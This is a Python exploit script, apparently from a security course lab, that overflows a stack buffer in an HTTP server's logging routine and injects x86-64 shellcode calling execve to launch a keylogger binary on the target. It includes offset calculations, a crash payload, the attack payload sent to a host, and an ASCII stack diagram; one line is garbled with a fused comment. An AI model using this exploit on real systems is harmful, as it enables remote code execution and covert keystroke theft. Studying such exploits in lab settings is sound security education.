from keystone import *
from pwn import *

### CONFIGS ###
host = "192.168.152.130"
port = 8080
original_rbp = 0x7ffff7ad1920 # the rbp value before the 'ret' instruction executed
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer


# wait to copy the keylogger binary to the remote machine (allowed in scenario 1)
input("Copy the 'keylogger' binary to 'server_data'. Input anything to continue...")
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)


### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"


### CREATE THE ATTACK PAYLOAD ###
keylogger = b"./keylogger"
placeholder = b"12345678"
keylogger_len = len(keylogger)
placeholder_len = len(placeholder)
# the offset of our injected payload wrt the current 'rsp' after 'ret' (required because of challenge 1)
# details: see stack representation at the bottom
payload_rsp_offset = 0x10 + log_buffer_rbp_offset - log_buffer_prefix - message_prefix_len
shell_code=f"""
  # setup execve args
  # note: when launching a program from a shell, the first command argument to the new process is the command invocation that launched the program
  # when manually launching a program with execve, you can either:
  # - follow this "convention", in which case the launched program can access additional command line arguments starting at index 1 (like if it were launched from a shell)
  # - or you can choose to put something else as first argument and make the launched program aware that the arguments start at index 0!
  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
  lea rsi, [rsp-{payload_rsp_offset - keylogger_len}] # argv: ptr to placeholder (future NULL ptr)
  lea rdx, [rsp-{payload_rsp_offset - keylogger_len}] # envp (= argv)
  # put a NULL ptr in the placeholder
  xor rax, rax
  mov [rdx], rax
  # perform the execve syscall
  mov al, 59
  syscall
"""

# assemble the shell code
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(shell_code)

# build the payload
sc1_exploit = message_prefix
sc1_exploit += keylogger + placeholder # add the argument datasc1_exploit += bytes(encoding0 # add assembled shell code
sc1_exploit += bytes(encoding) # add assembled shell code
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc1_exploit) # len includes the 24 bytes
sc1_exploit += b"q" * padding_size # add padding
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len + keylogger_len + placeholder_len # the new (absolute) return address points to the first byte of the shell code
sc1_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
sc1_exploit += b"\r\n\r\n"

print(sc1_exploit)

### PERFORM ATTACK ###
# remote(host, port).send(crash) # send crash payload
# sleep(2) # let the server restart
remote(host, port).send(sc1_exploit) # send attack payload


# details for 'payload_rsp_offset':
#
# stack representation after return to the injected shell code:
#
#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
#                                         |            |                         |
#                                         ||<---0x10-->|<---------0x450--------->|
# stack: <high addresses> =|=E====B======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
#                          |               |           |<5>|=========<4>=========|
#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
#                                          |                       |<-24->|<-49->|
#                                          |<--payload_rsp_offset->|
#                                                                  └> start of injected payload
# Legend:
#   <1>: caller stack frame
#   <2>: spilled rbp of the caller
#   <3>: log_message stack frame
#   <4>: vulnerable buffer
#   <5>: other local variables
#   <6>: injected payload
#   <7>: "GET /data.txt HTTP/1.1\r\n"
#   <8>: "== Request from..."